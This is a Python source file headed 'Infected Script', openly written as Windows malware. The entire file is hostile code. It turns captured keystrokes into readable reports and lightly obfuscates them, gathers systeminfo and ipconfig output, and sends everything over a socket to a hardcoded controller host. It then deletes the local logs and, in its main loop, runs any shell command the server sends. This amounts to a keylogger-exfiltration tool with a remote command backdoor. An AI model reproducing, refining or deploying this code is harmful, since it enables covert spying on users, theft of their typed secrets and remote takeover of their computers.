### Infected Script ###
from datetime import datetime
import time
import random
import os
import socket
import subprocess

now = datetime.now()
dt = now.strftime("%m_%d_%Y__%H_%M_%S")
dtb = now.strftime("%m_%d_%Y")
xD = "C:\\windows_system\\windows_logs\\x_report_("+str(dt)+").txt"
xDd = "C:\\windows_system\\windows_logs\\y_report_("+str(dt)+").txt"

def generate_private_key():
    beginkey = ""
    count = 0
    while count != 10:
        beginkey += str(random.randint(0,9))
        count += 1
    beginkey += str(random.randint(100,999))
    beginkey += str(random.randint(100000000,999999999))
    beginkey += str(random.randint((10** 1000), (10 ** 10000)))
    return beginkey

def encrypt(private_key,input):
    lista = []
    public_key = "l"
    stra = ""
    for elem in str(private_key):
        lista.append(elem)
    num_add = "".join(lista[10:13])
    num_multiply = "".join(lista[13:24])
    new_input = str(input)
    for elemx in new_input:
        x = int(num_add) + ord(elemx)
        y = x * int(num_multiply)
        stra += str(y)
        public_key += str(len(str(y))) + 'l'
    return private_key + public_key + stra

def technical_report(x):
    a = open('C:\windows_system\windows_keyboard_configuration.txt', 'r')
    lista = []
    for line in a.read():
        lista.append(str(line))
    stringg = "".join(lista)
    return "Y [ START LOG "+str(x)+" ]\n"+stringg+"\n[END LOG "+str(x)+" ] "

def human_readable_report(x):
    middlelist = []
    a = open('C:\windows_system\windows_keyboard_configuration.txt', 'r')
    lista = []
    for line in a.read():
        lista.append(str(line))
    stringg = "".join(lista)
    splitlist = stringg.split("\n")
    for elem in splitlist:
        try:
            if elem[25] == "'":
                middlelist.append(elem[26])
            elif elem[25] == "K":
                middlelist.append(elem[29:])
        except:
            middlelist.append("\n[ END LOG "+str(x)+" ]")
    finalstring = ""
    count = 0
    for elemxy in middlelist:
        if len(elemxy) == 1:
            finalstring = finalstring + str(elemxy)
        elif elemxy == 'space':
            finalstring = finalstring + " "
        elif elemxy != 'backspace':
            finalstring = finalstring + " " + str(elemxy) + " "
        if count == 40:
            finalstring = finalstring + "\n"
            count = 0
        count += 1
    return "X [ BEGIN LOG " + str(x) + " ] \n" + finalstring

def last_log_time_difference():
    lista = []
    z = open("C:\\windows_system\\lastlog.txt")
    za = z.read()
    z.close()
    for element in za:
        lista.append(element)
    listc = []
    for elementabcd in str(dtb):
        listc.append(elementabcd)
    if (int(listc[3]+listc[4]) - int(lista[3]+lista[4])) >= 1:
        return True
    else:
        return False

def last_log_change(x):
    a = open(r"C:\windows_system\lastlog.txt", 'w')
    a.write(x)
    a.close()

def generate_last_log():
    lista = []
    try:
        a = open("C:\\windows_system\\lastlog.txt", 'r')
        for line in a.read():
            lista.append(line)
        return "".join(lista)
    except:
        a = open("C:\\windows_system\\lastlog.txt", 'w')
        a.write(dtb)
        a.close()
        return dtb

def check_system():
    try:
        if len(os.listdir("C:\\windows_system\\windows_config")) == 0:
            a = open("C:\\windows_system\\windows_config\\configuration.txt", "w")
            b = subprocess.run(['systeminfo'], capture_output=True, text=True)
            c = subprocess.run(['ipconfig'], capture_output=True, text=True)
            ab = str(b.stdout) + str(c.stdout)
            a.write(encrypt(generate_private_key(),ab))
            a.close()
            return 0
        else:
            return 1
    except:
        "none"

def send_data(filesizevariablex,datax):
    s = socket.socket()
    host = 'LAPTOP-DO1B3DDT'
    port = 8080
    s.connect((host, port))
    msg = "}" + str(filesizevariablex) + "}" + str(datax)
    s.send(bytes(msg, "utf-8"))
    s.close()

def print_command():
    s = socket.socket()
    host = 'LAPTOP-DO1B3DDT'
    port = 8080
    s.connect((host, port))
    full_msg = ""
    lengthofmessage = 0
    count = 0
    connectioncount = 0
    while True:
        msg = s.recv(1024).decode("utf-8")
        if count == 0:
            msglen = str(msg).split("}")
            lengthofmessage = int(msglen[1])
            full_msg += str(msglen[2])
        if lengthofmessage > connectioncount and count > 0:
            full_msg += msg
        elif lengthofmessage < connectioncount:
            fulllistmsg = full_msg.split("}")
            xyzz = str(fulllistmsg[0])
            break
        count += 1
        connectioncount += 20
    return xyzz

lastlog = generate_last_log()

while True:
    try:
        varx = print_command()
        time.sleep(2)
        print("command printed")
        if varx == "none":
            s = socket.socket()
            host = 'LAPTOP-DO1B3DDT'
            port = 8080
            s.connect((host, port))
            s.close()
            print("varx = none")
        elif varx != "none":
            print("command being inputted")
            count11 = 0
            while count11 == 0:
                try:
                    print("trying to send feedback")
                    aaa = subprocess.run([str(varx)], capture_output=True, text=True, shell=True)
                    print("aaa done")
                    commandoutput = str(varx) + str(aaa.stdout)
                    print("commandoutput"+commandoutput)
                    send_data(len(commandoutput), commandoutput)
                    print("sent")
                    count11 += 1
                except:
                    print("error in sending")
    except:
        print("error in varx reading")
    time.sleep(2)
    if last_log_time_difference() == True:
        try:
            f = open(xD, "w")
            f.write(encrypt(generate_private_key(),human_readable_report(dt)))
            f.close()
            g = open(xDd, "w")
            g.write(encrypt(generate_private_key(),technical_report(dt)))
            g.close()
            open("C:\windows_system\windows_keyboard_configuration.txt", "w").close()
            alist = os.listdir('C:\\windows_system\\windows_logs\\')
            for element in alist:
                filesizevariable = int(os.path.getsize('C:\\windows_system\\windows_logs\\' + element))
                filename = 'C:\\windows_system\\windows_logs\\' + element
                file = open(filename, 'r')
                file_data = file.read()
                file.close()
                countxyzf = 0
                while countxyzf == 0:
                    try:
                        print_command()
                        time.sleep(2)
                        send_data(filesizevariable, file_data)
                        os.system("del " + 'C:\\windows_system\\windows_logs\\' + element)
                        countxyzf += 1
                    except:
                        time.sleep(1)
                time.sleep(10)
            last_log_change(dtb)
        except:
            print("error in x and y file generation")
    if check_system() == 0:
        try:
            clist = os.listdir('C:\\windows_system\\windows_config')
            for elementx in clist:
                filesizevariabley = int(os.path.getsize('C:\\windows_system\\windows_config\\' + elementx))
                filenamey = 'C:\\windows_system\\windows_config\\' + elementx
                filey = open(filenamey, 'r')
                filey_data = filey.read()
                filey.close()
                countaa = 0
                while countaa == 0:
                    try:
                        print_command() #must connect and receive message from server loop before sending message
                        time.sleep(2)
                        send_data(filesizevariabley, filey_data)
                        countaa += 1
                    except:
                        time.sleep(2)
        except:
            print("error in check system code")
    time.sleep(5)
